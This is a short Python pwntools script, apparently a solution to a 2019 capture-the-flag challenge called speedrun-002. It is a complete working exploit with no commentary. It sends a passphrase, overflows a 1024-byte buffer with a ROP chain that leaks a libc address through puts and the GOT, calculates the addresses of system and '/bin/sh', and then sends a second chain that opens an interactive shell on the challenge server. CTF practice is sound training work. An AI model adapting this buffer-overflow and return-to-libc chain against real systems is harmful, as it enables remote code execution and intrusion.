from pwn import *
io=remote("speedrun-002.quals2019.oooverflow.io",31337)
#io=process("./speedrun-002")
#gdb.attach(io)
io.recvuntil("now?")
io.sendline("Everything intelligent is so boring.\x00")
rbp=0x601088
poprdi=0x004008a3
puts=0x00000000004005b0
got=0x0000000000600ff0
io.recvuntil(" more.")
payload="a"*1024+p64(rbp)+p64(poprdi)+p64(got)+p64(puts)+p64(0x400600)
io.sendline(payload)
io.recvuntil("ating.\n")
leak=io.recv(6)
leak=leak+"\x00\x00"
leak=u64(leak)
#leak="0x"+leak)
print leak
#leak=int(leak,16)
print hex(leak)
base=leak-0x21ab0
system=base+0x4f440
binsh=base+0x1b3e9a
#io.recvuntil("ee well.")
io.sendline("Everything intelligent is so boring.\x00")
io.recvuntil(" more.")
payload2="a"*1024+p64(rbp)+p64(poprdi)+p64(binsh)+p64(0x004008a1)+p64(0)*2+p64(0x004006ec)+p64(0)+p64(system)
io.sendline(payload2)
io.interactive()
